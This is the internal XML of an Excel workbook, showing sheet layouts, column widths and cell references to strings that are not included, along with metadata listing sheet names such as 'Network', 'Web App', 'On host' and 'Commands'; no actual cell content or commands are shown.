      <c r="H4" s="5"/>
    </row>
    <row r="8" spans="1:9" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="G8" s="5"/>
    </row>
    <row r="9" spans="1:9" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E9" s="4"/>
    </row>
    <row r="10" spans="1:9" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E10" s="4"/>
    </row>
    <row r="11" spans="1:9" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E11" s="4"/>
    </row>
    <row r="12" spans="1:9" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E12" s="4"/>
    </row>
    <row r="13" spans="1:9" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E13" s="4"/>
    </row>
    <row r="22" spans="8:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="H22" s="5"/>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5"/>
  <sheetViews>
    <sheetView zoomScale="75" zoomScaleNormal="75" workbookViewId="0">
      <pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"/>
      <selection activeCell="B1" sqref="B1"/>
      <selection pane="bottomLeft" activeCell="K4" sqref="K4"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultColWidth="15.77734375" defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="21.88671875" style="2" customWidth="1"/>
    <col min="2" max="4" width="15.77734375" style="2"/>
    <col min="5" max="5" width="30.109375" style="2" customWidth="1"/>
    <col min="6" max="7" width="15.77734375" style="2"/>
    <col min="8" max="8" width="47.88671875" style="2" customWidth="1"/>
    <col min="9" max="9" width="18.44140625" style="2" customWidth="1"/>
    <col min="10" max="10" width="85.21875" style="2" customWidth="1"/>
    <col min="11" max="11" width="38.44140625" style="2" customWidth="1"/>
    <col min="12" max="16384" width="15.77734375" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:11" s="4" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A1" s="4" t="s">
        <v>11</v>
      </c>
      <c r="B1" s="4" t="s">
        <v>4</v>
      </c>
      <c r="C1" s="4" t="s">
        <v>2</v>
      </c>
      <c r="D1" s="4" t="s">
        <v>3</v>
      </c>
      <c r="E1" s="4" t="s">
        <v>12</v>
      </c>
      <c r="F1" s="4" t="s">
        <v>13</v>
      </c>
      <c r="G1" s="4" t="s">
        <v>14</v>
      </c>
      <c r="H1" s="4" t="s">
        <v>5</v>
      </c>
      <c r="I1" s="4" t="s">
        <v>10</v>
      </c>
      <c r="J1" s="3" t="s">
        <v>21</v>
      </c>
      <c r="K1" s="4" t="s">
        <v>9</v>
      </c>
    </row>
    <row r="2" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A2" s="1" t="s">
        <v>100</v>
      </c>
      <c r="E2" s="2" t="s">
        <v>87</v>
      </c>
      <c r="F2" s="2" t="s">
        <v>91</v>
      </c>
      <c r="G2" s="2" t="s">
        <v>90</v>
      </c>
      <c r="H2" s="2" t="s">
        <v>99</v>
      </c>
      <c r="I2" s="5"/>
      <c r="J2" s="2" t="s">
        <v>88</v>
      </c>
    </row>
    <row r="3" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A3" s="1" t="s">
        <v>100</v>
      </c>
      <c r="E3" s="1" t="s">
        <v>97</v>
      </c>
      <c r="I3" s="5"/>
      <c r="J3" s="2" t="s">
        <v>98</v>
      </c>
    </row>
    <row r="4" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A4" s="1"/>
      <c r="E4" s="1"/>
    </row>
    <row r="5" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A5" s="1"/>
      <c r="J5" s="4"/>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B18"/>
  <sheetViews>
    <sheetView tabSelected="1" zoomScale="80" zoomScaleNormal="80" workbookViewId="0">
      <pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"/>
      <selection pane="bottomLeft" activeCell="A24" sqref="A24"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="118.33203125" style="6" customWidth="1"/>
    <col min="2" max="2" width="18.44140625" style="2" customWidth="1"/>
    <col min="3" max="16384" width="8.88671875" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:2" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A1" s="4" t="s">
        <v>6</v>
      </c>
      <c r="B1" s="4" t="s">
        <v>27</v>
      </c>
    </row>
    <row r="2" spans="1:2" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A2" s="8" t="s">
        <v>102</v>
      </c>
    </row>
    <row r="3" spans="1:2" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A3" s="8" t="s">
        <v>103</v>
      </c>
    </row>
    <row r="4" spans="1:2" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A4" s="6" t="s">
        <v>20</v>
      </c>
    </row>
    <row r="5" spans="1:2" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A5" s="6" t="s">
        <v>19</v>
      </c>
    </row>
    <row r="6" spans="1:2" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A6" s="6" t="s">
        <v>104</v>
      </c>
    </row>
    <row r="7" spans="1:2" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A7" s="6" t="s">
        <v>23</v>
      </c>
    </row>
    <row r="8" spans="1:2" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A8" s="6" t="s">
        <v>105</v>
      </c>
    </row>
    <row r="9" spans="1:2" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A9" s="6" t="s">
        <v>106</v>
      </c>
    </row>
    <row r="10" spans="1:2" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A10" s="6" t="s">
        <v>94</v>
      </c>
    </row>
    <row r="11" spans="1:2" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A11" s="6" t="s">
        <v>107</v>
      </c>
    </row>
    <row r="12" spans="1:2" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A12" s="6" t="s">
        <v>89</v>
      </c>
    </row>
    <row r="13" spans="1:2" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A13" s="6" t="s">
        <v>92</v>
      </c>
    </row>
    <row r="14" spans="1:2" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A14" s="6" t="s">
        <v>93</v>
      </c>
    </row>
    <row r="15" spans="1:2" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A15" s="6" t="s">
        <v>108</v>
      </c>
    </row>
    <row r="16" spans="1:2" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A16" s="6" t="s">
        <v>95</v>
      </c>
    </row>
    <row r="17" spans="1:1" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A17" s="6" t="s">
        <v>109</v>
      </c>
    </row>
    <row r="18" spans="1:1" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A18" s="6" t="s">
        <v>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A2"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="C9" sqref="C9"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="80.88671875" style="2" bestFit="1" customWidth="1"/>
    <col min="2" max="16384" width="8.88671875" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A1" s="4" t="s">
        <v>22</v>
      </c>
    </row>
    <row r="2" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A2" s="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2D08-FB8B-4BAB-A462-7059BEE8513F}">
  <dimension ref="A1:D3"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="D23" sqref="D23"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="14.4" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="12.109375" style="1" bestFit="1" customWidth="1"/>
    <col min="2" max="2" width="13.5546875" style="1" bestFit="1" customWidth="1"/>
    <col min="3" max="3" width="15.5546875" style="1" customWidth="1"/>
    <col min="4" max="4" width="29.6640625" style="1" bestFit="1" customWidth="1"/>
    <col min="5" max="16384" width="8.88671875" style="1"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:4" s="3" customFormat="1" x14ac:dyDescent="0.3">
      <c r="A1" s="3" t="s">
        <v>25</v>
      </c>
      <c r="B1" s="3" t="s">
        <v>24</v>
      </c>
      <c r="C1" s="3" t="s">
        <v>26</v>
      </c>
      <c r="D1" s="3" t="s">
        <v>5</v>
      </c>
    </row>
    <row r="3" spans="1:4" x14ac:dyDescent="0.3">
      <c r="D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Network</vt:lpstr>
      <vt:lpstr>Web App</vt:lpstr>
      <vt:lpstr>On host</vt:lpstr>
      <vt:lpstr>Commands</vt:lpstr>
      <vt:lpstr>Misc</vt:lpstr>
      <vt:lpstr>Reverse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2026-07-30T12:10:23Z</dcterms:modified>
</cp:coreProperties>
</file>